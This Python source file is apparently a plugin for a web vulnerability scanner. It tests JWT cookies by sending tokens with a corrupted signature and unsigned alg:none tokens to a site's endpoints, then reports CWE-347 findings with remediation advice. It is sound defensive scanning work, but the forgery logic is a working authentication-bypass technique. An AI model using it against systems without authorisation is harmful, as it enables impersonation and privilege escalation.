"""JWT attacks: alg:none acceptance and signature-verification bypass."""

from __future__ import annotations

import base64
import json
from urllib.parse import urlsplit

from argos.engine.findings import Finding, Severity, truncate
from argos.engine.http import parse_cookie_header
from argos.engine.probe import similar
from argos.engine.registry import Check, ScanContext, register


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _is_jwt(value: str) -> bool:
    parts = value.split(".")
    return len(parts) == 3 and parts[0].startswith("eyJ") and parts[1] != ""


@register
class JWTAttacks(Check):
    name = "jwt-attacks"
    mode = "active"
    min_profile = "quick"
    summary = "JWT: alg:none acceptance and ignored signature checks"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        # tokens: name -> value, from --cookie and from crawled Set-Cookie
        tokens: dict[str, str] = dict(
            (k, v) for k, v in parse_cookie_header(ctx.config.cookie or "").items()
            if _is_jwt(v)
        )
        for page in ctx.pages:
            for raw in page.cookies:
                first = raw.split(";", 1)[0]
                if "=" in first:
                    name, _, value = first.partition("=")
                    if _is_jwt(value.strip()):
                        tokens.setdefault(name.strip(), value.strip())
        if not tokens:
            return []

        # candidate endpoints: wherever the token might be consumed
        origin = f"{ctx.config.url.rstrip('/')}"
        split = urlsplit(origin)
        base = f"{split.scheme}://{split.netloc}"
        urls: list[str] = [origin]
        for page in ctx.pages:
            if page.url.startswith(base) and page.url not in urls:
                urls.append(page.url)
        for link in sorted(
            {lnk for page in ctx.pages for lnk in page.links if lnk.startswith(base)}
        ):
            if link not in urls:
                urls.append(link)
        urls = urls[:12]

        for name, token in tokens.items():
            other = parse_cookie_header(ctx.config.cookie or "")
            other.pop(name, None)
            without = "; ".join(f"{k}={v}" for k, v in other.items()) or "argosno=1"
            header_b64, payload_b64, sig = token.split(".")

            for url in urls:
                r_full = await ctx.client.get(url, headers={"Cookie": f"{name}={token}"})
                r_none_req = await ctx.client.get(url, headers={"Cookie": without})
                if (
                    r_full.status_code == r_none_req.status_code
                    and similar(r_full.text, r_none_req.text)
                ):
                    continue  # token has no effect on this endpoint

                # 1) tampered signature — accepted means verification is broken
                bad_sig = sig[:-1] + ("a" if not sig.endswith("a") else "b")
                r_bad = await ctx.client.get(
                    url, headers={"Cookie": f"{name}={header_b64}.{payload_b64}.{bad_sig}"}
                )
                if (
                    r_bad.status_code == r_full.status_code
                    and similar(r_bad.text, r_full.text)
                ):
                    findings.append(
                        self._finding(
                            "JWT signature not verified",
                            "CWE-347",
                            url,
                            name,
                            token,
                            r_bad,
                            (
                                "Corrupting the token's signature produced a response "
                                "identical to the valid token — the server never checks "
                                "the signature, so any attacker-forged claims are trusted."
                            ),
                        )
                    )

                # 2) alg:none — unsigned token accepted. Oracle: the response
                # must be authenticated content (differs from the no-token
                # response) and must not simply be the same rejection the
                # tampered token received.
                none_header = _b64url_encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                )
                r_none = await ctx.client.get(
                    url, headers={"Cookie": f"{name}={none_header}.{payload_b64}."}
                )
                differs_from_unauth = not (
                    r_none.status_code == r_none_req.status_code
                    and similar(r_none.text, r_none_req.text)
                )
                looks_like_rejection = (
                    similar(r_none.text, r_bad.text)
                    and not similar(r_none.text, r_full.text)
                )
                if differs_from_unauth and not looks_like_rejection:
                    findings.append(
                        self._finding(
                            "JWT alg:none accepted (unsigned token)",
                            "CWE-347",
                            url,
                            name,
                            token,
                            r_none,
                            (
                                "A token with alg=none and no signature was accepted as "
                                "if it were valid — attackers forge arbitrary roles/"
                                "identities, including administrator claims."
                            ),
                        )
                    )
                break  # one working endpoint per token is enough
        return findings

    @staticmethod
    def _finding(
        title: str,
        cwe: str,
        url: str,
        cookie_name: str,
        token: str,
        resp,
        why: str,
    ) -> Finding:
        return Finding(
            plugin="jwt-attacks",
            title=title,
            severity=Severity.CRITICAL,
            cvss=9.1,
            cwe=cwe,
            url=url,
            parameter=cookie_name,
            description=(
                f"Cookie '{cookie_name}' carries a JWT ({token[:40]}...) that the "
                f"server accepts at {url}. {why}"
            ),
            remediation=(
                "Pin the accepted algorithm server-side (reject 'none' and any "
                "algorithm not explicitly expected), verify signatures with a "
                "strong key, and validate exp/aud/iss claims on every use."
            ),
            evidence_request=f"GET {url}\nCookie: {cookie_name}=<forged token>",
            evidence_response=truncate(
                f"HTTP {resp.status_code}\n{resp.text[:600]}", 800
            ),
        )
